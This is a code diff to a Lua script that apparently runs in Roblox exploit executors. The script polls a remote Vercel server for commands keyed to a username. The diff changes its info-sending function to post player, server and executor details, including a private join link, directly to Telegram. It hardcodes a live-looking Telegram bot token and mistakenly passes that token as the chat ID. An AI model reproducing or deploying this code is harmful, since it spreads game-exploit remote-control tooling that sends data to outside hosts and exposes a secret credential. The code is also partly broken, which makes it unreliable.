@@ -6,7 +6,7 @@ local BOT_TOKEN = "8506651300:AAEuhXSs86i1x_yCznkfefjz8vIz9gGTqmg"
 local SERVER = "https://remote-roblox.vercel.app"
 
 --======================--
---  CUSTOM HTTP WRAPPER
+--  HTTP WRAPPER
 --======================--
 
 local Http = {}
@@ -33,7 +33,7 @@ local endpoint = SERVER .. "/getcmd/" .. HttpService:UrlEncode(username)
 print("[CMD LISTENER] Started for:", username)
 
 --======================--
---  FLAG
+-- FLAG
 --======================--
 
 local flag = Instance.new("BoolValue")
@@ -41,7 +41,7 @@ flag.Name = "ScriptConnected"
 flag.Parent = Players.LocalPlayer
 
 --======================--
---  UTILS
+-- UTILS
 --======================--
 
 local function debug(msg)
@@ -64,51 +64,65 @@ local function hop()
 	TeleportService:Teleport(game.PlaceId)
 end
 
---==========================
---  SEND INFO → SERVER
---==========================
+--============================================--
+--  SEND INFO → DIRECT TELEGRAM API
+--============================================--
+
 local function sendInfo()
+	local HttpS = game:GetService("HttpService")
 	local marketplace = game:GetService("MarketplaceService")
 	local info = marketplace:GetProductInfo(game.PlaceId)
 
 	local placeName = info.Name or "Unknown"
 	local placeId = game.PlaceId
 	local jobId = game.JobId
-	local encodedJob = HttpService:UrlEncode(jobId)
 
 	local joinLink =
-		"https://www.roblox.com/games/" .. placeId .. "/?privateServerLinkCode=" .. encodedJob
+		"https://www.roblox.com/games/"
+		.. placeId
+		.. "/?privateServerLinkCode="
+		.. HttpS:UrlEncode(jobId)
 
 	local playerCount = #Players:GetPlayers()
 	local maxPlayers = Players.MaxPlayers
 
-	local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
+	local ping = math.floor(
+		game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
+	)
 
 	local exec = (identifyexecutor and identifyexecutor()) or "N/A"
 
-	local url = SERVER .. "/roblox/info"
-		.. "?user=" .. HttpService:UrlEncode(username)
-		.. "&map=" .. HttpService:UrlEncode(placeName)
-		.. "&placeId=" .. placeId
-		.. "&jobId=" .. HttpService:UrlEncode(jobId)
-		.. "&link=" .. HttpService:UrlEncode(joinLink)
-		.. "&players=" .. tostring(playerCount)
-		.. "&max=" .. tostring(maxPlayers)
-		.. "&ping=" .. tostring(ping)
-		.. "&fps=N/A"
-		.. "&exec=" .. HttpService:UrlEncode(exec)
-		.. "&token=" .. BOT_TOKEN -- ⛔ TOKEN TIDAK DI-ENCODE
+	-- TEXT
+	local message =
+		"ℹ️ INFO PLAYER: " .. username .. "\n\n" ..
+		"🗺 Map: " .. placeName .. "\n" ..
+		"🏷 PlaceId: " .. placeId .. "\n" ..
+		"🌀 JobId: " .. jobId .. "\n" ..
+		"🔗 Join: " .. joinLink .. "\n\n" ..
+		"👥 Players: " .. playerCount .. "/" .. maxPlayers .. "\n" ..
+		"📡 Ping: " .. ping .. "ms\n" ..
+		"⚙ Executor: " .. exec
+
+	-- TELEGRAM API DIRECT SEND
+	local url =
+		"https://api.telegram.org/bot"
+		.. BOT_TOKEN
+		.. "/sendMessage?chat_id="
+		.. BOT_TOKEN
+		.. "&text="
+		.. HttpS:UrlEncode(message)
 
 	pcall(function()
-		HttpService:GetAsync(url)
+		game:HttpGet(url)
 	end)
 
-	debug("Info sent to server")
+	debug("Info sent via Telegram API")
 end
 
---==========================
---  MAIN LOOP
---==========================
+--============================================--
+-- MAIN LOOP
+--============================================--
+
 while true do
 	task.wait(2)
 
@@ -120,6 +134,8 @@ while true do
 		debug("HTTP ERROR: " .. tostring(response))
 		continue
 	end
+
+	if response == "" then continue end
 
 	local cmdData
 	local ok = pcall(function()
